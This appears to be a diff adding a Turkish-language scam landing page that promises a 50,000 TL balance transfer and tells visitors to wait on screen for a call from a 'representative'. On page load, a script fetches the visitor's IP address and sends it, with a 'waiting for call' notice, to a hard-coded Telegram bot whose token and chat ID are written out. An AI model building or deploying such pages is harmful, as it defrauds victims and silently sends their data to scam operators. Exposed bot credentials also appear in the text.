@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Onay Bekleniyor</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <style>
+        /* Body stili */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0; /* Kenar boşluklarını kaldır */
+            padding: 0; /* İçerik boşluklarını kaldır */
+            background-color: #f8f8f8; /* Arka plan rengi */
+        }
+
+        /* Header bar stili */
+        .header-bar {
+            background-color: #08591b; /* Üst kısım için istediğiniz renk */
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Logo stil */
+        .header-bar img {
+            max-height: 50px;
+        }
+
+        /* Resim boyutu ve ortalama */
+        img {
+            max-width: 55%; /* Resmin genişliği %100 olacak şekilde ayarlandı */
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Container stil */
+        .container {
+            text-align: center;
+            margin-top: 20px; /* Üst kısımdan biraz boşluk */
+        }
+
+        p {
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header bar -->
+    <div class="header-bar">
+        <img src="logo.png" alt="Logo">
+    </div>
+
+    <!-- Ana içerik -->
+    <div class="container">
+        <img src="temsilci.png" alt="Telesekreter">
+        <p>50.000 TL BAKİYENİZE AKTARILMA ONAYI İÇİN</p>
+        <p>LÜTFEN TEMSİLCİNİZDEN GELECEK ÇAĞRIYI BEKLEYİNİZ</p>
+        <p>(Bu süreçte Bu ekrandan Ayrılmayınız)</p>
+        <img src="bekle.gif" alt="Bekleme">
+    </div>
+
+    <script>
+        // Telegram API bilgileri
+        var chatId = "-1002343753859"; // Telegram chat ID
+        var token = "7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY"; // Telegram bot token
+        var baseMessage = "50k için çağrı bekliyor.";
+
+        // IP adresini almak için kullanılan fonksiyon
+        function getIPAddress() {
+            return fetch('https://api.ipify.org?format=json') // IP adresini ipify API'sinden alıyoruz
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('IP adresi alınırken hata oluştu:', error);
+                    return "IP adresi alınamadı"; // Hata durumunda geri dönüş
+                });
+        }
+
+        // Telegram mesajı gönderme fonksiyonu
+        function sendTelegramMessage(message) {
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+            var data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            // AJAX isteği ile mesaj gönderme
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log("Mesaj başarıyla gönderildi:", result);
+            })
+            .catch(error => {
+                console.error("Mesaj gönderilirken hata oluştu:", error);
+            });
+        }
+
+        // IP adresini alıp mesajı birleştirip gönderme işlemi
+        window.onload = function() {
+            getIPAddress().then(ip => {
+                var finalMessage = baseMessage + "\nKullanıcının IP adresi: " + ip;
+                sendTelegramMessage(finalMessage);
+            });
+        };
+    </script>
+
+</body>
+
+</html>
